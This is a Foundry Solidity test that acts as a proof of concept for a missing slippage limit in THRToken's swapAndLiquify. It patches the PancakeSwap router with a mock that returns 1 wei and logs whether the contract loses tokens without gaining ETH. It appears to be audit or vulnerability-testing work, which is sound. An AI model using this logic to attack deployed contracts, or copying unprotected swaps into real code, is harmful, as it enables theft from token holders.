// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/THRToken.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x123456789);
    }
}

contract MockRouter {
    address public factory;
    address public WETH;

    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address to,
        uint256
    ) external {
        // Simulate minimal ETH return (1 wei) to test slippage vulnerability
        payable(to).transfer(1);
    }

    function addLiquidityETH(
        address,
        uint256,
        uint256,
        uint256,
        address,
        uint256
    ) external payable {}
}

contract THRTokenSlippageTest is Test {
    THRToken token;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant owner = 0x66a4b9a21B402B395254EA5C1c7d640644788888;
    address user = address(0xAAA);

    function setUp() public {
        // Create mock components
        MockFactory mockFactory = new MockFactory();
        address mockWETH = address(0xdEaD);
        MockRouter mockRouter = new MockRouter(address(mockFactory), mockWETH);

        // Patch Pancake router address with mock
        vm.etch(PANCAKE_ROUTER, address(mockRouter).code);
        
        // Set mock router's storage correctly (factory at slot0, WETH at slot1)
        vm.store(
            PANCAKE_ROUTER,
            bytes32(uint256(0)),
            bytes32(uint256(uint160(address(mockFactory))))
        );
        vm.store(
            PANCAKE_ROUTER,
            bytes32(uint256(1)),
            bytes32(uint256(uint160(mockWETH)))
        );
        
        // Fund mock router
        vm.deal(PANCAKE_ROUTER, 1 ether);

        // Deploy token and configure
        vm.startPrank(owner);
        token = new THRToken();
        token.setSwapAndLiquifyEnabled(true);
        
        // Prepare test state
        uint256 tokensToTrigger = 1000 * 10**18;
        token.transfer(address(token), tokensToTrigger);
        token.transfer(user, 50000 * 10**18);
        token.excludeFromFee(user);
        vm.stopPrank();
    }

    function testSlippageVulnerability() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 tokenBalanceBefore = token.balanceOf(address(token));
        uint256 ethBalanceBefore = address(token).balance;
        console.log("Contract token balance before:", tokenBalanceBefore);
        console.log("Contract ETH balance before:", ethBalanceBefore);

        console.log("--- Trigger Transfer ---");
        // Verify vulnerability: no slippage limit causes successful completion with bad swap
        vm.prank(user);
        token.transfer(address(0xB0B), 1); // Triggers swapAndLiquify
        
        console.log("--- AFTER-Trigger State ---");
        uint256 tokenBalanceAfter = token.balanceOf(address(token));
        uint256 ethBalanceAfter = address(token).balance;
        console.log("Contract token balance after:", tokenBalanceAfter);
        console.log("Contract ETH balance after:", ethBalanceAfter);

        // State comparison and exploitation check
        uint256 tokenBalanceDecrease = tokenBalanceBefore - tokenBalanceAfter;
        uint256 ethBalanceIncrease = ethBalanceAfter - ethBalanceBefore;
        
        console.log("Token balance decrease:", tokenBalanceDecrease);
        console.log("ETH balance increase:", ethBalanceIncrease);
        
        // Vulnerability confirmed if token balance decreased while ETH balance didn't significantly increase
        bool tokenLoss = tokenBalanceDecrease > 0;
        bool ethNotGained = ethBalanceIncrease == 0;
        bool vulnerabilityExploited = tokenLoss && ethNotGained;
        
        console.log("Vulnerability Exploited:", vulnerabilityExploited ? "YES" : "NO");

        // Final vulnerability verification
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Contract token balance decreased without equivalent ETH gain");
        } else {
            console.log("Vulnerability not Exist: No token loss or ETH gain detected");
        }
    }
}